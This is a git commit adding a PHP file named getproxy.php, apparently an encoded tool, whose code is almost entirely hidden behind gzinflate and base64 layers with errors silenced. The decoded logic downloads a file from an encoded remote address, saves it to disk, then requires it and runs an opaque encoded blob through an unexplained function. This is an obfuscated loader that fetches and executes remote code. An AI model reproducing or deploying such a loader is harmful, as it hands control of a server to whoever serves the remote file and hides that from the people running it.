45b64f9394ad81b7c3ffd89b354b9b978dfe637b
Arnaofvalor <120366005+Arnaofvalor@users.noreply.github.com>
2024-04-28 08:02:24 +0700

    Add files via upload

---
+++ getproxy.php
@@ -0,0 +1,15 @@
+<?php
+/*
+------------------------
+# Encode php version 8.2.3
+# Admin: Hào Milk
+# Ip: ??
+# User-agent: ??
+# Description: ??
+# Address: ??
+------------------------
+*/
+error_reporting(0);  
+define(gzinflate(base64_decode("S0nNTypNAwA=")), gzinflate(base64_decode('009JLEnUBxPJ+bl6JalFuaUV+mmZOanF+qXFRfoZifkpqWV6BRkFAA==')));  if(file_exists(gzinflate(base64_decode('009JLEnUBxPJ+bl6JalFuaUV+mmZOanF+qXFRfoZifkpqWV6BRkFAA==')))) {require gzinflate(base64_decode("009JLEnUBxPJ+bl6JalFuaUV+mmZOanF+qXFRfoZifkpqWV6BRkFAA==")); EXT_G63(gzinflate(base64_decode("NdRH1mxQFAXgAVWDkjXFi0Lhyj05U3IY/fs774xgr72/dRRiVbn/R/rBgyGJXz/H3hldvjU1NQC8v2dnAkBTIwkcWBTz/GrwvCW0KB8GEXFFgoCtNia74rG7r7re3kSjx+Xmgd7/+RfVaM6KzclkFWfiuAdq7Cj6cceNyckHGgml11fDWKXywu+X9RCH+C7NX9Ux8+DF/QB/v0Eih40+jZaegrQ6jqJspbRcLH93lMwQVihxMB+mOUSt331MSSQ75ELOWDzX1SskCeXh1jtd9l3igjBDU9lbg2CkbY/B0dxoSbk59336paNOupSh6f3BWSyjEAcl8I9tXCefO/15qz7fnrRrTr8zdwOWBvSehDuitvvMsvhUfzCXnR3rKr5KOBK0/Bijt4TrS7ldfhQ5e2t4chX4kZeMDN6Pk8iNNumQhK0mhG/vTuHb4lg/MVdZRMGmbU6lDzOYY186VPJSYyhP15MLarWj30MMtoiYZ9sy8/1aTsnldfqO99FkkFHD8x9L72GJ28c6rCNLrGGphumTjylKf0995t4veEiUmt5CEZJyGYekacsNcU90oSW5UWCFF4hTytksXxmgzOAD8mtMEznpDe5vk9qx1puPE1HSekyJML9RSEMSuoHd217bM1WZpApqcU+4s8vsQPRGbzJnEH+oNeFScYqWt7C6Pqv2AtD5rvm2i4E37uqBzymEv0SiukGf2nluia6COmYTMPzQzA2bD6dKYUxqzOR2rm5lgu/ydzVHSew23Fhqmb5Hb6P0iWgXFbuA2ixzGck/2HtZcn2elnhOPpBb502TDiPaXkG7k4zmkIaAM0pFZWNK4XluWbFiVXjxVdtXhtQx/a6dr9tZoksTUW3GdnS3khvIbXQNwiIvpbhwXm8cJi3jdb5Z4HUqNVVTkuRZ1ccKAK1HQMkgUd03pphQi9olzpnM3wghaeHbccbvN0Bb84sMEEv4wTIiW5Y0BqfHS9wBXwF3D1K1Y7mG6S7OSAhT9rWLct9F1sFqct3eZn0K0+tAg62n9pZP7MQdDdlX8Drd0OXhKJwOaURxt3PpntioBhY/bNGUvRzeLSIui58kzhvJJGcGY45AEQSeclKL3Sk80+3QzNma+iXaGuoZe6Dv7S9nksqm8bJzFmAo/Qec8oSW4CS1jAW6joiP7egi5/2w4ucbAd3yW1rKkxsam+2zHeV2bTX13qKXb6hHawHb+vlCk36AeV4BH32you/UNffyqyUjpwL+wCrZJckXwFlFaTPwB82vmEZPxGwJeZf4ZJjSLhrnjXigOzUaesXcG943E3k1WfRdL4BaN+bBpntSAlzbXhiztgGZS3j0FiqlFDY/6e6DRYxAn0tARe2gxPw7Uuce9VvpJUjXtUZxgRTl6xl7BLHo1MQtGq+Qc2wWMwFiSNHrSwcFvtr4ErgwJGjtks9PEHoN2kZNQvvNEIW7ZljzEXfDgeAfyT/fhsr0z6KR1O76f4YTwbxVq0l1F8xnj5+Bzq2yp6Ydor02jD1W38fv2IYaditB9c0hx9oJlBeR84M8s/oj9WHmKd5KamCRpWpo2CzDAYS4IB3dKC/nYQMtmy1RQ9heDcgohgIJLMaShSfu5NPvENcdL/Ts/fxAHfRk+Wcvy0tiAcIMPsEWWozkIU1db8v66+HaAwRZcCCviiNkm2/G22GQ4Qd3VhLhiL+HNPxptznuHw=="))); } else {print (gzinflate(base64_decode("c3q4a2GeQnLGsQ2JCsmHF2QqHJn4cNf2EoXc/JTSnFQdIDcxL10h+eGutQUKeRlgCiIFAA=="))); $afeebae= @file_get_contents(gzinflate(base64_decode("yygpKSi20tdPzyzJKE3SS87P1XdKzEjMNzI1NDDQz03J0S9KLNfPTczM0weKpqSW6ZVUlAAA"))); @file_put_contents(gzinflate(base64_decode("009JLEnUBxPJ+bl6JalFuaUV+mmZOanF+qXFRfoZifkpqWV6BRkFAA==")), $afeebae); print( gzinflate(base64_decode("8zi8uFLBOePhroWVCj5AMhPIObbh2MK8dIWQosNr8jIU/DIOrwQA"))); exit();
+}
+    
